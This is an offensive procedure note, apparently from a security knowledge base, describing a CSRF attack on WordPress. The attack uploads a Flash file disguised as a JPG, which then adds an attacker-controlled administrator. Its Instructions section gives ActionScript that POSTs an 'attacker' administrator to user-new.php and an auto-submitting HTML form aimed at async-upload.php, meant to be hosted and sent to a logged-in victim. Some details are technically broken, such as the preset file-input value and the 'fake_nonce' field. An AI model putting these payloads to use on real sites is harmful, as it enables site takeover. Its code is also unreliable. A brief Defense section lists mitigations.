---
tags:
  - csrf
  - wordpress
  - file-upload
  - flash
  - privilege-escalation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:20.292Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: eb67e949-66f3-4dc1-913f-f6028677d6cd
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# CSRF-File-Upload-of-Malicious-Flash-to-Add-Admin-in-WordPress

## Summary

This procedure exploits a CSRF vulnerability in WordPress file upload functionality by uploading a malicious Flash (SWF) file disguised with a trusted extension like .jpg. The Flash plugin ignores the extension and Content-Type, loading and executing the file to perform unauthorized actions, such as adding a new admin user via cross-domain requests.

## Description

In vulnerable WordPress versions (pre-July 2016), the media upload feature lacked strict file-type validation, allowing attackers to craft a CSRF attack. The attacker creates an SWF file with ActionScript that sends a POST request to add an admin user. By renaming the SWF to a trusted type (e.g., image/jpeg) and using a CSRF form submission, a logged-in admin is tricked into uploading it without interaction. Once uploaded, accessing the file URL triggers the Flash plugin to execute the script, bypassing same-origin policy if crossdomain.xml permits, leading to privilege escalation. This was reported by researcher abdullah on HackerOne (#149589) and fixed with stricter MIME-type and extension checks.

## Requirements

1. Access to craft and host a malicious SWF file (requires Flash development tools like Adobe Flash Professional)
2. Target WordPress site with an authenticated admin victim (e.g., via phishing to deliver CSRF page)
3. Web browser supporting Flash plugin (common in 2016 era)
4. Knowledge of target's WordPress upload endpoint (/wp-admin/media-new.php or async-upload.php)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all forms, including file uploads
- Enforce strict file validation: check both extension and MIME-type/content signature (e.g., reject non-image magic bytes)
- Disable Flash plugin or use modern browsers without Flash support
- Monitor upload logs for anomalous file types and admin creation events
- Use WordPress security plugins like Wordfence for upload scanning

## Objectives

1. Upload malicious Flash file via CSRF without user consent
2. Execute Flash to perform unauthorized POST to add admin user
3. Achieve persistent admin access for further compromise

## Instructions

### Step 1: Craft Malicious Flash File

**Context**: Create an SWF file with ActionScript to send a POST request adding a new admin user to the WordPress database.

Use Adobe Flash or a decompiler to write ActionScript code like:

```actionscript
// Example ActionScript to POST admin creation
var loader:URLLoader = new URLLoader();
var request:URLRequest = new URLRequest("https://target.com/wp-admin/user-new.php");
request.method = URLRequestMethod.POST;
var vars:URLVariables = new URLVariables();
vars.action = "createuser";
vars.user_login = "attacker";
vars.email = "attacker@example.com";
vars.role = "administrator";
vars.submit = "Add New User";
request.data = vars;
loader.load(request);
```

Compile to SWF and rename to trusted.jpg (ensure content starts with Flash magic bytes CWS or FWS).

> This step prepares the payload; test locally with a Flash player to verify execution.

### Step 2: Create CSRF Upload Page

**Context**: Build an HTML page that auto-submits a form to the WordPress upload endpoint, attaching the disguised SWF file.

Create HTML:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://target.com/wp-admin/async-upload.php" method="POST" enctype="multipart/form-data">
<input type="hidden" name="post_id" value="0">
<input type="hidden" name="_wpnonce" value="fake_nonce">
<!-- Include other required fields from WordPress form -->
<input type="file" name="async-upload" value="path/to/malicious.jpg">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

Host this page on attacker-controlled server and send link to victim.

> Upon visit, the form submits automatically, uploading the file if victim is logged in.

### Step 3: Trigger Flash Execution and Verify

**Context**: Access the uploaded file URL to load it in the browser, triggering Flash execution to add the admin.

After upload, the file is stored in /wp-content/uploads/. Retrieve URL (e.g., https://target.com/wp-content/uploads/2023/10/malicious.jpg) and open in browser with Flash enabled.

The Flash executes the POST; check WordPress admin (/wp-admin/users.php) for new user.

> Success if no errors in Flash console and new admin appears.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[wordpress]]
- [[file-upload]]
- [[flash]]
- [[privilege-escalation]]
